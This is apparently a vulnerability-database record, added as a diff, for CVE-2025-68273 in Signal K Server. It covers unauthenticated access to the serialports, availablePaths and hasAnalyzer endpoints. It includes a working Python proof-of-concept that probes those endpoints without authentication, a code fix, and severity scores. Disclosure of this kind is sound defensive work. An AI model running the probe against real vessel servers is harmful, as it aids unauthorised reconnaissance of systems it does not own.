@@ -1,0 +1,209 @@
+vulnerability_id: VCID-dhrt-w941-s7bx
+aliases:
+  - CVE-2025-68273
+  - GHSA-fpf5-w967-rr2m
+summary: |
+  Signal K Server Vulnerable to Unauthenticated Information Disclosure via Exposed Endpoints
+  [Note] This is a separate issue from the RCE vulnerability (State Pollution) currently being patched. While related to tokensecurity.js, it involves different endpoints and risks.
+
+  ### Summary
+  An unauthenticated information disclosure vulnerability allows any user to retrieve sensitive system information, including the full SignalK data schema, connected serial devices, and installed analyzer tools. This exposure facilitates reconnaissance for further attacks.
+
+  ### Details
+  The vulnerability stems from the fact that several sensitive API endpoints are not included in the authentication middleware's protection list in `src/tokensecurity.js`.
+
+  **Vulnerable Code Analysis:**
+  1.  **Missing Protection**: The `tokensecurity.js` file defines an array of paths that require authentication. However, the following paths defined in `src/serverroutes.ts` are missing from this list:
+      - `/skServer/serialports`
+      - `/skServer/availablePaths`
+      - `/skServer/hasAnalyzer`
+
+  2.  **Unrestricted Access**: Because they are missing from the protection list, the `http_authorize` middleware allows access to these paths even when `enableSecurity` is set to `true`.
+
+  **Exploit Scenario:**
+  1.  **Reconnaissance**: An attacker scans the server for these endpoints.
+  2.  **Data Extraction**:
+      - Querying `/skServer/availablePaths` returns the full JSON schema of the vessel's data (e.g., `environment.sun.sunrise`, `navigation.position`), allowing the attacker to know exactly what data points are available for targeting.
+      - Querying `/skServer/serialports` reveals connected hardware (e.g., `/dev/ttyUSB0`), aiding in physical device targeting.
+
+  ### PoC
+  The following Python script demonstrates the vulnerability by querying the exposed endpoints without any authentication headers.
+
+  ```python
+  import urllib.request
+  import json
+
+  BASE_URL = "http://localhost:3000"
+
+  def check_endpoint(name, path):
+      url = f"{BASE_URL}{path}"
+      print(f"[*] Checking {name} at {url}...")
+      try:
+          req = urllib.request.Request(url)
+          with urllib.request.urlopen(req) as response:
+              if response.getcode() == 200:
+                  print(f"[!] VULNERABLE: {name} is accessible without authentication!")
+                  content = response.read().decode('utf-8')
+                  print(f"    Snippet: {content[:100]}...")
+              else:
+                  print(f"[-] Secure: {response.getcode()}")
+      except urllib.error.HTTPError as e:
+          print(f"[-] Secure: {e.code}")
+      except Exception as e:
+          print(f"[-] Error: {e}")
+
+  if __name__ == "__main__":
+      print("--- SignalK Information Disclosure PoC ---")
+      check_endpoint("Serial Ports", "/skServer/serialports")
+      check_endpoint("Available Paths", "/skServer/availablePaths")
+      check_endpoint("Analyzer Check", "/skServer/hasAnalyzer")
+  ```
+
+  **Expected Result:**
+  The script will output `[!] VULNERABLE` for all three endpoints, showing snippets of the leaked JSON data.
+
+  ### Impact
+  **Verified Information Disclosure**:
+  During our verification, we successfully retrieved the following sensitive information without any authentication:
+  1.  **Full Data Schema**: The `/skServer/availablePaths` endpoint returned the complete JSON schema of the vessel's data.
+      *   **Example**: `environment.sun.sunrise`, `navigation.position`
+      *   **Leakage of Internal State**: We also observed entries like `notifications.security.accessRequest.readwrite.attacker-device-32`, which revealed the presence and IDs of pending access requests (traces of our DoS attack), showing that internal server state is exposed.
+  2.  **Hardware Configuration**: The `/skServer/serialports` endpoint exposed the list of connected serial devices.
+  3.  **System Capabilities**: The `/skServer/hasAnalyzer` endpoint revealed whether traffic analysis tools were installed.
+
+  This information allows an attacker to map the system's internal state and capabilities, significantly facilitating further targeted attacks (Reconnaissance).
+
+  ---
+  ### Remediation
+  **Update `src/tokensecurity.js`**
+  Add the missing paths to the list of protected routes in `src/tokensecurity.js`.
+
+  ```javascript
+  // src/tokensecurity.js
+
+  // ... existing protected paths ...
+  ;[
+    '/apps',
+    '/appstore',
+    '/plugins',
+    '/restart',
+    '/runDiscovery',
+    '/security',
+    '/vessel',
+    '/providers',
+    '/settings',
+    '/webapps',
+    '/skServer/inputTest',
+    // ADD THESE LINES:
+    '/skServer/serialports',
+    '/skServer/availablePaths',
+    '/skServer/hasAnalyzer'
+  ].forEach((p) =>
+    app.use(`${SERVERROUTESPREFIX}${p}`, http_authorize(false))
+  )
+  ```
+severities:
+  - score: '0.00036'
+    scoring_system: epss
+    scoring_elements: '0.10375'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68273
+  - score: '0.00036'
+    scoring_system: epss
+    scoring_elements: '0.1041'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68273
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-fpf5-w967-rr2m
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/SignalK/signalk-server
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/SignalK/signalk-server
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/commit/ead2a03d8994969cafcca0320abee16f0e66e7a9
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/commit/ead2a03d8994969cafcca0320abee16f0e66e7a9
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2026-01-02T18:55:48Z/
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-fpf5-w967-rr2m
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-fpf5-w967-rr2m
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-fpf5-w967-rr2m
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2026-01-02T18:55:48Z/
+    published_at: None
+    url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-fpf5-w967-rr2m
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68273
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68273
+weaknesses:
+  - CWE-200
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-68273
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/commit/ead2a03d8994969cafcca0320abee16f0e66e7a9
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-fpf5-w967-rr2m
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-68273
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-fpf5-w967-rr2m
+    reference_type:
+    reference_id: GHSA-fpf5-w967-rr2m
